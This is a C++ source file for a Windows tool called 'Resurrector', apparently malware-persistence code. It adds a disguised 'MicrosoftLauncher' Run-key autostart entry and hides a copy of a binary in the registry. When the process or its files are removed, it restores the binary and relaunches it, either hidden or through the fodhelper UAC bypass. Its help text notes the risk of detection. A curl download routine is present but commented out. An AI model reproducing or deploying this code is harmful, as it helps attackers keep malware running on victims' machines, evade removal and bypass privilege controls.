#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <unordered_map>
#include <string>
#include <vector>
#include <fstream>
#include <curl/curl.h>

/*
    Arguments:
        -f <filepath> : File Path of the Binary (not null)
        -p <process name> : Process Name (not null)
        -r <registry key> : Registry Keys, can be multiple separated by comma (optional)
        -files <files> : Other files, if one of two of this files is not found, the process will resurrected, can be multiple separated by comma (optional)
        -l <limit> : Limit of the counter, if the counter is greater or equal to the limit, the process will resurrected (optional)
        -admin : Run the process as admin (optional) (More Possibilities to become detected) (can fail in some systems!)
        -h : Help
*/

using namespace std;

const wchar_t* wRegistryPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\RulesEngine";
string value = "FileValue";


bool runProcAsAdminFromUser(string procName) {
    HKEY hkey;
    DWORD d;
    const char* settings = "Software\\Classes\\ms-settings\\Shell\\Open\\command";
    const char* del = "";
    bool success = false;

    // Attempt to open or create the registry key
    LSTATUS stat = RegCreateKeyEx(HKEY_CURRENT_USER, (LPCWSTR)settings, 0, NULL, 0, KEY_WRITE, NULL, &hkey, &d);
    if (stat != ERROR_SUCCESS) {
        cout << "Failed to open or create reg key\n";
        return success;
    }

    // Set the registry values (command and DelegateExecute)
    stat = RegSetValueEx(hkey, L"", 0, REG_SZ, (unsigned char*)procName.c_str(), strlen(procName.c_str()));
    if (stat != ERROR_SUCCESS) {
        cout << "Failed to set reg value\n";
        return success;
    }

    // Set the DelegateExecute value to an empty string
    stat = RegSetValueEx(hkey, L"DelegateExecute", 0, REG_SZ, (unsigned char*)del, strlen(del));
    if (stat != ERROR_SUCCESS) {
        cout << "Failed to set reg value: DelegateExecute\n";
        return success;
    }

    // Close the key handle
    RegCloseKey(hkey);

    SHELLEXECUTEINFO sei = { sizeof(sei) };
    sei.lpVerb = L"runas";
    sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
    sei.hwnd = NULL;
    sei.nShow = SW_NORMAL;

    // Start the fodhelper.exe program with elevated privileges
    if (!ShellExecuteEx(&sei)) {
        DWORD err = GetLastError();
        printf(err == ERROR_CANCELLED ? "The user refused to allow privilege elevation.\n" : "Unexpected error! Error code: %ld\n", err);
    }
    else {
        printf("Successfully created process =^..^=\n");
    }
    success = true;
    return success;
}


int persistenceViaRunKeys(const char* exe) {
    HKEY hkey = NULL;
    LONG res = RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS) {
        DWORD dataSize = 0;
        res = RegQueryValueExW(hkey, L"MicrosoftLauncher", NULL, NULL, NULL, &dataSize);
        if (res != ERROR_SUCCESS) {
            wchar_t* wide_exe = NULL;
            int wide_len = MultiByteToWideChar(CP_UTF8, 0, exe, -1, NULL, 0);
            wide_exe = new wchar_t[wide_len];
            MultiByteToWideChar(CP_UTF8, 0, exe, -1, wide_exe, wide_len);
            RegSetValueExW(hkey, L"MicrosoftLauncher", 0, REG_SZ, (BYTE*)wide_exe, (wide_len + 1) * sizeof(wchar_t));
            delete[] wide_exe;
        }
        RegCloseKey(hkey);
    }
    return 0;
}


bool isProcessRunning(wstring processName) {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return false;
    }
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return false;
    }
    do {
        if (processName.compare(pe32.szExeFile) == 0) {
            CloseHandle(hProcessSnap);
            return true;
        }
    } while (Process32Next(hProcessSnap, &pe32));
    CloseHandle(hProcessSnap);
    return false;
}

bool existsFile(string filePath) {
    DWORD dwAttrib = GetFileAttributesA(filePath.c_str());
    return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

bool existsRegistryKey(const std::string& registryKey) {
    HKEY hKey;
    std::wstring wRegistryKey(registryKey.begin(), registryKey.end());

    LONG lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, wRegistryKey.c_str(), 0, KEY_READ, &hKey);
    if (lResult == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

size_t WriteCallback(void* ptr, size_t size, size_t nmemb, FILE* stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}
//
//int downloadBinary(string url, string filePath) {
//    // download the binary from the URL
//    CURL* curl;
//    FILE* fp;
//    CURLcode res;
//
//    curl = curl_easy_init();
//    if (curl) {
//        fp = fopen(filePath.c_str(), "wb");
//        if (!fp) {
//            std::cerr << "Error: No se pudo abrir el archivo para escribir.\n";
//            return 1;
//        }
//
//        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
//
//        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
//
//        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
//
//        res = curl_easy_perform(curl);
//
//        if (res != CURLE_OK) {
//            std::cerr << "Error en la solicitud: " << curl_easy_strerror(res) << "\n";
//            fclose(fp);
//            curl_easy_cleanup(curl);
//            return 1;
//        }
//
//        fclose(fp);_
//
//        curl_easy_cleanup(curl);
//        return 0;
//    }
//
//    std::cerr << "Error: No se pudo inicializar curl.\n";
//    return 1;
//}

std::wstring stringToWstring(const std::string& str) {
    return std::wstring(str.begin(), str.end());
}

string wstringToString(wstring wstr) {
    string str(wstr.begin(), wstr.end());
    return str;
}

bool DoesRegistryEntryExist(const wchar_t* wRegistryPath, const wchar_t* valueName) {
    HKEY hKey;
    LONG result;

    // Intentar abrir la clave del registro
    result = RegOpenKeyEx(HKEY_CURRENT_USER, wRegistryPath, 0, KEY_READ, &hKey);
    if (result != ERROR_SUCCESS) {
        return false; // No se pudo abrir la clave (probablemente no existe)
    }

    // Intentar consultar el valor en la clave del registro
    result = RegQueryValueEx(hKey, valueName, nullptr, nullptr, nullptr, nullptr);
    RegCloseKey(hKey); // Cerrar la clave del registro

    return (result == ERROR_SUCCESS); // Si result es ERROR_SUCCESS, la entrada existe
}

// Set file as binary in registry
bool setFileAsBinary(const std::string& srcFile) {
    std::wstring wSrcFile = stringToWstring(srcFile);

    HANDLE hFile = CreateFile(wSrcFile.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Error opening file: " << GetLastError() << std::endl;
        return false;
    }

    HKEY hKey;
    LONG openStatus = RegOpenKeyEx(HKEY_CURRENT_USER, wRegistryPath, 0, KEY_SET_VALUE, &hKey);
    if (openStatus != ERROR_SUCCESS) {
        std::cerr << "Error opening registry key: " << openStatus << std::endl;
        CloseHandle(hFile);
        return false;
    }

    const DWORD CHUNK_SIZE = 1024;
    BYTE buffer[CHUNK_SIZE];
    DWORD bytesRead;

    std::vector<BYTE> fileData;

    while (ReadFile(hFile, buffer, CHUNK_SIZE, &bytesRead, NULL) && bytesRead > 0) {
        fileData.insert(fileData.end(), buffer, buffer + bytesRead);
    }

    LSTATUS status = RegSetValueEx(hKey, L"FileValue", 0, REG_BINARY, fileData.data(), fileData.size());
    if (status != ERROR_SUCCESS) {
        std::cerr << "Error setting registry value: " << status << std::endl;
        CloseHandle(hFile);
        RegCloseKey(hKey);
        return false;
    }

    std::cout << "File stored in the registry as binary data." << std::endl;
    CloseHandle(hFile);
    RegCloseKey(hKey);

    return true;
}


bool getFileAsBinary(const std::string& valueName, const std::string& dtsFile) {
    HKEY hKey;
    LONG openStatus = RegOpenKeyEx(HKEY_CURRENT_USER, wRegistryPath, 0, KEY_QUERY_VALUE, &hKey);
    if (openStatus != ERROR_SUCCESS) {
        std::cerr << "Error opening registry key: " << openStatus << std::endl;
        return false;
    }

    DWORD valueType;
    DWORD dataSize = 0;
    std::wstring valueNameL = stringToWstring(valueName);

    LONG queryValueStatus = RegQueryValueEx(hKey, valueNameL.c_str(), NULL, &valueType, NULL, &dataSize);
    if (queryValueStatus != ERROR_SUCCESS || valueType != REG_BINARY) {
        std::cerr << "Error retrieving registry value size or wrong value type." << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    std::vector<BYTE> buffer(dataSize);

    queryValueStatus = RegQueryValueEx(hKey, valueNameL.c_str(), NULL, &valueType, buffer.data(), &dataSize);
    if (queryValueStatus != ERROR_SUCCESS) {
        std::cerr << "Error retrieving registry value." << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    std::ofstream outfile(dtsFile, std::ios::binary);
    if (!outfile.is_open()) {
        std::cerr << "Error opening output file." << std::endl;
        RegCloseKey(hKey);
        return false;
    }

    outfile.write(reinterpret_cast<const char*>(buffer.data()), buffer.size());
    outfile.close();

    std::cout << "File retrieved and saved successfully." << std::endl;

    RegCloseKey(hKey);
    return true;
}


int main(int argc, char* argv[])
{
    if (argc < 2) {
        cout << "Usage: Resurrector.exe -f <filepath> -p <process name> [-r <registry key>] [-files <files>] [-l <limit>] [-admin] [-h <help>]" << endl;
        cout << "Use -h for help" << endl;
        return 1;
    }


    string filePath = "";
    string processName = "";
    vector<string> registryKeys;
	unordered_map<string, string> registries;
    vector<string> files;
    bool admin = false;
    int counter = 0;
    int countLimit = -1;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-f") == 0) {
            filePath = argv[i + 1];
        }
        else if (strcmp(argv[i], "-p") == 0) {
            processName = argv[i + 1];
        }
        else if (strcmp(argv[i], "-r") == 0) {
            string registryKey = argv[i + 1];
            // split the registry keys by comma
            size_t pos = 0;
            string token;
            while ((pos = registryKey.find(",")) != string::npos) {
                token = registryKey.substr(0, pos);
                registryKeys.push_back(token);
                registryKey.erase(0, pos + 1);
            }
            registryKeys.push_back(registryKey); // Add the last registry key
			for (string key : registryKeys) {
                // replace the / with \\ to be compatible with the registry
				for (int i = 0; i < key.size(); i++) {
					if (key[i] == '/') {
						key[i] = '\\';
					}
				}

				// split the last / or \\ to get the registry key and the value
				size_t pos = key.find_last_of("/\\");
				string value = key.substr(pos + 1);
				key = key.substr(0, pos);
				registries[key] = value;
			}
        }
        else if (strcmp(argv[i], "-files") == 0) {
            string file = argv[i + 1];
            // split the files by comma
            size_t pos = 0;
            string token;
            while ((pos = file.find(",")) != string::npos) {
                token = file.substr(0, pos);
                files.push_back(token);
                file.erase(0, pos + 1);
            }
            files.push_back(file); // Add the last file
        }
        else if (strcmp(argv[i], "-h") == 0) {
            cout << "Usage: Resurrector.exe -f <filepath> -p <process name> [-r <registry key>] [-files <files>] [-l <limit>] [-h <help>]" << endl;
            cout << "\nArguments:" << endl;
            cout << "    -f <filepath> : File Path of the Binary (not null)" << endl;
            cout << "    -p <process name> : Process Name (not null)" << endl;
            cout << "    -r <registry key> : Registry Keys, can be multiple separated by comma (optional)" << endl;
            cout << "    -files <files> : Other files, if one of two of this files is not found, the process will resurrected, can be multiple separated by comma (optional)" << endl;
            cout << "    -l <limit> : Limit of the counter, if the counter is greater or equal to the limit, the process will resurrected (optional)" << endl;
            cout << "    -admin : Run the process as admin (optional) (More Possibilities to become detected) ([!]can fail in some systems!)" << endl;
            cout << "    -h : Help" << endl;
            return 0;
        }
        else if (strcmp(argv[i], "-l") == 0) {
            countLimit = atoi(argv[i + 1]);
        }
        else if (strcmp(argv[i], "-admin") == 0) {
            admin = true;
        }
    }

    if (countLimit == -1) {
        countLimit = 3;
    }

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    // create the persistence via Run Keys with this current executable
    // get the complete command to run the current executable

    string completeCommand = path;
    for (int i = 1; i < argc; i++) {
        completeCommand += " ";
        completeCommand += argv[i];
    }
    cout << "Complete Command: " << completeCommand << endl;
    char* cCompleteCommand = new char[completeCommand.size() + 1];
    strcpy(cCompleteCommand, completeCommand.c_str());
    persistenceViaRunKeys(cCompleteCommand);


    cout << "File Path: " << filePath << endl;
    cout << "Process Name: " << processName << endl;
    cout << "Admin: " << admin << endl;
    cout << "Registry Keys: ";
    for (string registryKey : registryKeys) {
        cout << registryKey << " ";
    }
    cout << endl;
    cout << "Files: ";
    for (string file : files) {
        cout << file << " ";
    }
    cout << endl;

    // if the paths or registry keys have '/' replace it with '\\'
    for (int i = 0; i < filePath.size(); i++) {
        if (filePath[i] == '/') {
            filePath[i] = '\\';
        }
    }

    for (int i = 0; i < files.size(); i++) {
        for (char& c : files[i]) {
            if (c == '/') {
                c = '\\';
            }
        }
    }

    for (int i = 0; i < registryKeys.size(); i++) {
        for (char& c : registryKeys[i]) {
            if (c == '/') {
                c = '\\';
            }
        }
    }

    // check if the registry with the binary already exists, if not, create it
    string registryKey = wstringToString(wRegistryPath);
	wchar_t* registrName = new wchar_t[value.size() + 1];
	mbstowcs(registrName, value.c_str(), value.size() + 1);
    if (!DoesRegistryEntryExist(wRegistryPath, registrName)) {
		setFileAsBinary(filePath);
    }

    cout << "\n[!] Resurrector Detector started" << endl;
    cout << "[+] Results:" << endl;

    // check if the process is running	
    if (isProcessRunning(wstring(processName.begin(), processName.end()))) {
        cout << "Process is running" << endl;
    }
    else {
        cout << "Process is not running" << endl;
        counter++;
    }

    // check if the files are in their paths
    for (string file : files) {
        if (existsFile(file)) {
            cout << "File " << file << " exists" << endl;
        }
        else {
            cout << "File " << file << " does not exist" << endl;
            counter++;
        }
    }

    // check if the binary is in the path
    if (existsFile(filePath)) {
        cout << "Binary exists" << endl;
    }
    else {
        cout << "Binary does not exist" << endl;
        counter = counter + 2;
    }

    // check if the registry keys are in the registry, iterate registries hashmap and use DoesRegistryEntryExist
    for (const auto& entry : registries) {
        const string& key = entry.first;  // Access the key
        const string& value = entry.second;  // Access the value
		wchar_t* keyName = new wchar_t[key.size() + 1];
		mbstowcs(keyName, key.c_str(), key.size() + 1);
		wchar_t* valueName = new wchar_t[value.size() + 1];
		mbstowcs(valueName, value.c_str(), value.size() + 1);

		if (DoesRegistryEntryExist((const wchar_t*)keyName, (const wchar_t*)valueName)){
            cout << "Registry Key " << key << " exists" << endl;
        }
        else {
            cout << "Registry Key " << key << " does not exist" << endl;
            counter++;
        }
    }

    

    cout << "\n[!] Counter: " << counter << endl;
    cout << "[!] Count Limit: " << countLimit << endl;

    if (counter > countLimit) {
        cout << "Resurrecting process" << endl;
		// recover the binary from the registry
		string buffer;
		//int size = getFileSizeFromRegister();
		getFileAsBinary(value, filePath);
        if (admin) {
            runProcAsAdminFromUser(filePath);
        }
        else {
            ShellExecuteA(NULL, "open", filePath.c_str(), NULL, NULL, SW_HIDE);
        }
    }
    else {
        cout << "Not resurrecting process" << endl;
    }

    return 0;
}